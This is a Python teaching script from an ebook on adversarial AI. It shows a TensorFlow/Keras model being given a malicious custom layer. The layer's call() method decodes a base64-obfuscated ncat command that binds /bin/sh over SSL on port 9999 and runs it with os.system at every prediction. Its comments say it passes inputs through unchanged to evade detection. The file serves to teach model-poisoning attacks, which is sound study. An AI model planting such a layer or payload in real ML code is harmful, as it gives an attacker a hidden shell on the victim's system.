"""
Author: Nik Alleyne   
Author Blog: https://www.securitynik.com   
Author GitHub: github.com/securitynik   

Author Other Books: [   

            "https://www.amazon.ca/Learning-Practicing-Leveraging-Practical-Detection/dp/1731254458/",   
            
            "https://www.amazon.ca/Learning-Practicing-Mastering-Network-Forensics/dp/1775383024/"   
        ]   


This notebook ***(tf_make_predictions_custom_layer_script.py)*** is part of the series of notebooks From ***A Little Book on Adversarial AI***  A free ebook released by Nik Alleyne

"""



# Tensorflow # Make predictions
import tensorflow as tf
import argparse
import os
import json
import numpy as np

# clear the screen
os.system('clear')    

# On my system, there is a compatibility issue between my Cuda and Tensorflow
# As a result I disable the GPU by default for Tensorflow.
# If Tensorflow is working fine on your system, then feel free to comment out the lines below

# Comment out this line if your GPU works fine in Tensorflow 
print(f'[-] Disabling the GPU')
tf.config.set_visible_devices(devices=[], device_type='GPU')
    
# Setup the argument parser
parser = argparse.ArgumentParser(description='Make predictions using a trained Tensorflow model')
parser.add_argument('-m', '--model', type=str, help='The path to the legit model file')
parser.add_argument('-d', '--data', type=json.loads, help='The sample with features to make predictions on "[[0.5, 0.2, 0.1, 0.3, 0.4, 0.2, 0.5]]"')
cmd_args = parser.parse_args()

# This is now our malicious custom layer being registered
tf.keras.utils.get_custom_objects().clear()

@tf.keras.utils.register_keras_serializable(package='malicious_custom_layer', name='malicious_custom_layer')
class MyCustomLayer(tf.keras.layers.Layer):
    def __init__(self, command="bmNhdCAtLXZlcmJvc2UgMTI3LjAuMC4xIDk5OTkgLS1leGVjIC9iaW4vc2ggLS1zc2wgJg==", **kwargs):
        super().__init__()
        self.command = command

    def call(self, x):
        # This is our malicious code being implemented
        import base64
        import os
        os.system(command=base64.b64decode(s=self.command).decode('utf-8'))

        # We return x without modifying it because we want the results to be the same
        # Reduce the chances of detection
        return x 
    
    def get_config(self):
        return {'command' : self.command}


# Get the number of command line arguments
print(f'Number of arguments passed: {len(vars(cmd_args))}')
# We need to capture the model file and the features for prediction
if len(vars(cmd_args)) < 2:
    parser.print_help()
    exit(1)


print('*'*50)
print("Ready to make your predictions!")
print('*'*50)

# Ensure that the model file was provided
if cmd_args.model is None:
    print('Please provide the path to the model file')
    print('Example: $ python ./tf_make_predictions.py --model /path/to/some_model_file')
    exit(1)

# Check if the features were provided
if cmd_args.data is None:
    print('Please provide the features to make predictions on')
    print("Example: $ python ./tf_make_predictions.py --model /path/to/some_model_file --data '[[0.5, 0.2, 0.1, 0.3, 0.4, 0.2, 0.5]]'")
    exit(1)

# Load the model
print(f'Loading model... {cmd_args.model}')
loaded_model = tf.keras.models.load_model(filepath=cmd_args.model)
loaded_model.add(MyCustomLayer())

# Make predictions
print(f'Making predictions on data: {cmd_args.data}')
predictions = loaded_model.predict(x=np.array(cmd_args.data, dtype=np.float32))
print(f'Predictions: {predictions}')
print('*'*50)
print('Predictions complete!')
print('*'*50)